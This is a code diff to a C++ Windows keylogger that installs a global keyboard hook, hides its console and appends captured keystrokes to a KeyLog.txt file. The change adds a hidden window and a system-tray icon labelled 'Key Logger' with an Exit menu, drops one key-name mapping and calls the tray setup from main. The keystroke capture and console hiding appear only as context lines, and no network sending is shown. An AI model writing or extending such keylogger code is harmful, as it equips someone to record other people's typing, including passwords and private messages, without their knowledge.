@@ -8,6 +8,78 @@ HHOOK g_hook = NULL;
 std::ofstream g_logFile("KeyLog.txt", std::ios::app);
 bool g_running = true;
 
+#define WM_TRAYICON (WM_USER + 1)
+#define TRAY_ICON_ID 1001
+NOTIFYICONDATA nid = {};
+const wchar_t CLASS_NAME[] = L"keyLogger";
+
+LRESULT CALLBACK HiddenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    switch (msg) {
+        case WM_TRAYICON:
+            switch (LOWORD(lParam)) {
+                case WM_LBUTTONUP:
+                    break;
+                case WM_RBUTTONUP: {
+                    POINT pt;
+                    GetCursorPos(&pt);
+                    SetForegroundWindow(hwnd);
+
+                    HMENU hMenu = CreatePopupMenu();
+                    AppendMenu(hMenu, MF_STRING, 1, L"Exit");
+
+                    TrackPopupMenu(hMenu, TPM_BOTTOMALIGN | TPM_LEFTALIGN, pt.x, pt.y, 0, hwnd, nullptr);
+                    DestroyMenu(hMenu);
+                    break;
+                }
+            }
+            break;
+
+        case WM_COMMAND:
+            if (LOWORD(wParam) == 1) {
+                PostQuitMessage(0);
+            }
+            break;
+
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            break;
+    }
+    return DefWindowProc(hwnd, msg, wParam, lParam);
+}
+
+
+void setupTray(HINSTANCE hInstance) {
+    WNDCLASS wc = {};
+    wc.lpfnWndProc = HiddenWndProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = CLASS_NAME;
+    RegisterClass(&wc);
+
+    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"HiddenWindow", WS_OVERLAPPEDWINDOW,
+                               0, 0, 0, 0, nullptr, nullptr, hInstance, nullptr);
+
+    nid.cbSize = sizeof(nid);
+    nid.hWnd = hwnd;
+    nid.uID = TRAY_ICON_ID;
+    nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
+    nid.uCallbackMessage = WM_TRAYICON;
+    nid.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
+    wcscpy_s(nid.szTip, L"Key Logger");
+
+    Shell_NotifyIcon(NIM_ADD, &nid);
+
+    MSG msg;
+    while (GetMessage(&msg, nullptr, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    Shell_NotifyIcon(NIM_DELETE, &nid);
+    DestroyWindow(hwnd);
+    UnregisterClass(CLASS_NAME, hInstance);
+}
+
+
 std::string GetTimestamp() {
     time_t now = time(0);
     struct tm tstruct;
@@ -48,7 +120,6 @@ std::string GetKeyName(DWORD vkCode) {
             case VK_SNAPSHOT: return "[PRINT SCREEN]";
             case VK_SCROLL: return "[SCROLL LOCK]";
             case VK_PAUSE: return "[PAUSE]";
-            case VK_LWIN: return "[WINDOWS]";
             default: return "[UNKNOWN]";
         }
     }
@@ -107,6 +178,9 @@ int main() {
     HideConsole();
 
     SetHook();
+
+    HINSTANCE hInstance = GetModuleHandle(nullptr);
+    setupTray(hInstance);
 
     MessageLoop();
 
